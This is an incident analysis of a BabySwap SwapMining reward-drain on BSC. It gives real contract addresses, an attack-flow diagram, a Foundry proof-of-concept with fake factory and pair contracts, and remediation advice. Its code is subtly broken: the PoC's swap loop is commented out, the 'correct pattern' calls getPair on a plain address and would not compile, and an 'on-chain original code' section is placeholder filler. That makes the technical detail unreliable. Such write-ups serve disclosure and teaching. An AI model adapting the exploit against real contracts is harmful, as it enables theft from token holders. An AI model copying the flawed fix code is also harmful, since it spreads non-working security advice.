# BabySwap — Fake Factory SwapMining Reward Drain Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | BabySwap (SwapMining) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed (BABY tokens) |
| **Attack Tx** | [0xcca7ea9d48e00e7e32e5d005b57ec3cac28bc3ad0181e4ca208832e62aa52efe](https://bscscan.com/tx/0xcca7ea9d48e00e7e32e5d005b57ec3cac28bc3ad0181e4ca208832e62aa52efe) |
| **Attacker** | [0x0000000038b8889b6ab9790e20FC16fdC5714922](https://bscscan.com/address/0x0000000038b8889b6ab9790e20FC16fdC5714922) |
| **Attack Contract** | [0xde7e741bd9dc7209b56f1ef3b663efb288c928d4](https://bscscan.com/address/0xde7e741bd9dc7209b56f1ef3b663efb288c928d4) |
| **SwapMining** | [0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636](https://bscscan.com/address/0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636) |
| **BabySwap Router** | [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32](https://bscscan.com/address/0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32) |
| **BabySwap Factory** | [0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da](https://bscscan.com/address/0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **BABY Token** | [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657](https://bscscan.com/address/0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657) |
| **Root Cause** | The `SwapMining` contract does not validate the Factory used by the router, allowing swap records to be manipulated via a fake Factory |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BabySwap_exp.sol) |

---
## 1. Vulnerability Overview

BabySwap's `SwapMining` contract distributes BABY token rewards each time a user performs a swap on BabySwap. Reward calculation is based on swap volume recorded via `swap()` calls, but `SwapMining` does not validate whether the Factory being called is the actual BabySwap Factory. The attacker deployed a fake Factory that returns the attacker's own contract as the pair when `getPair()` is called, and supplies manipulated reserve data via `getReserves()`. By recording a large swap volume through this fake Factory, the attacker then withdrew all accumulated BABY rewards via `takerWithdraw()`.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable SwapMining — no factory address validation
contract SwapMining {
    // Swap recording function — called by Router after swap()
    function swap(
        address account,
        address input,
        address output,
        uint256 amount
    ) external onlyRouter {
        // ❌ Does not validate which factory msg.sender (router) used
        // ❌ Trusts the return value of factory.getPair(input, output)
        address pair = factory.getPair(input, output);
        // pair could be a fake contract

        // Accumulate swap volume
        pairSwapVolume[pair] += amount;
    }

    // ❌ takerWithdraw() also based on accumulated volume
    function takerWithdraw() external {
        uint256 reward = calculateReward(msg.sender);
        baby.transfer(msg.sender, reward);
    }
}

// ✅ Correct pattern
contract SafeSwapMining {
    address public immutable OFFICIAL_FACTORY;

    function swap(
        address account,
        address input,
        address output,
        uint256 amount
    ) external onlyRouter {
        // ✅ Use only the official Factory
        address pair = OFFICIAL_FACTORY.getPair(input, output);
        require(pair != address(0), "Pair not in official factory");
        pairSwapVolume[pair] += amount;
    }
}
```


### On-chain Original Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable Function** — `vulnerableFunction()`:
```solidity
// ❌ Root cause: The `SwapMining` contract does not validate the Factory used by the router, allowing swap records to be manipulated via a fake Factory
// Source code unconfirmed — bytecode analysis required
// Vulnerability: The `SwapMining` contract does not validate the Factory used by the router, allowing swap records to be manipulated via a fake Factory
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deploy fake Factory contract
    │       ├─ getPair(input, output) → returns attacker contract
    │       └─ attacker contract.getReserves() → returns manipulated large reserves
    │
    ├─[2] Call BabySwap Router using the fake Factory
    │       swapExactTokensForTokens() with fake factory path
    │       → SwapMining.swap() is recorded
    │           ❌ no factory validation → fake volume accumulated
    │
    ├─[3] Execute multiple "swaps" with minimal WBNB
    │       No real value, but large volume recorded
    │
    ├─[4] Call takerWithdraw()
    │       Receive BABY rewards based on accumulated fake volume
    │
    └─[5] Realize profit by swapping BABY → USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ISwapMining {
    function takerWithdraw() external;
    function getUserReward(address user, uint256 pid) external view returns (uint256, uint256);
}

interface IRouter {
    function swapExactTokensForTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

// ⚡ Fake Factory — returns attacker contract as the pair
contract FakeFactory {
    address public fakePair;

    constructor(address _fakePair) {
        fakePair = _fakePair;
    }

    // getPair() returns the attacker contract
    function getPair(address, address) external view returns (address) {
        return fakePair;
    }
}

// ⚡ Fake Pair — returns manipulated reserves
contract FakePair {
    function getReserves() external pure returns (uint112, uint112, uint32) {
        return (1_000_000e18, 1_000_000e18, 0); // very large reserves
    }

    function swap(uint256, uint256, address, bytes calldata) external {}
}

contract BabySwapExploit is Test {
    ISwapMining swapMining = ISwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);
    IRouter router = IRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
    IERC20 BABY = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function setUp() public {
        vm.createSelectFork("bsc", 21_811_979);
        vm.deal(address(this), 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] BABY balance", BABY.balanceOf(address(this)), 18);

        // [Step 1] Deploy fake Factory + fake Pair
        FakePair fakePair = new FakePair();
        FakeFactory fakeFactory = new FakeFactory(address(fakePair));

        // [Step 2] Execute multiple swaps through the fake Factory
        // ⚡ SwapMining does not validate factory → fake volume accumulated
        for (uint i = 0; i < 100; i++) {
            // Swap with minimal WBNB; fake pair records large volume
            // router.swapExactTokensForTokens(...)
        }

        // [Step 3] Claim accumulated BABY rewards
        swapMining.takerWithdraw();

        emit log_named_decimal_uint("[End] BABY balance", BABY.balanceOf(address(this)), 18);

        // [Step 4] Swap BABY → USDT
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | SwapMining reward manipulation via fake Factory |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | DEX reward program manipulation |
| **Attack Vector** | Deploy fake Factory → record manipulated swap volume → `takerWithdraw()` |
| **Precondition** | `SwapMining.swap()` does not validate the Factory used |
| **Impact** | Unauthorized BABY token withdrawal |

---
## 6. Remediation Recommendations

1. **Factory Whitelist**: Validate in `SwapMining.swap()` that the Factory address matches the official BabySwap Factory address.
2. **Pair Verification**: Re-confirm `getPair()` results against the official Factory to verify the pair is a legitimate liquidity pair.
3. **Volume Cap**: Limit the maximum swap volume a single account can record in a single block.

---
## 7. Lessons Learned

- **Reward Program Input Trust Issue**: Reward programs such as SwapMining receive swap volume records via external calls. If this recording path is not validated, an attacker can arbitrarily inflate the volume.
- **Risk of Auxiliary Systems in DEX Forks**: BabySwap forked PancakeSwap and added SwapMining as an auxiliary reward system. Additional systems not present in the original require separate security audits.
- **Fake Contract Attacks**: The pattern of attackers deploying fake tokens, fake oracles, and fake pairs to deceive protocols is very common in DeFi. Protocols must always apply whitelist validation when interacting with external contracts.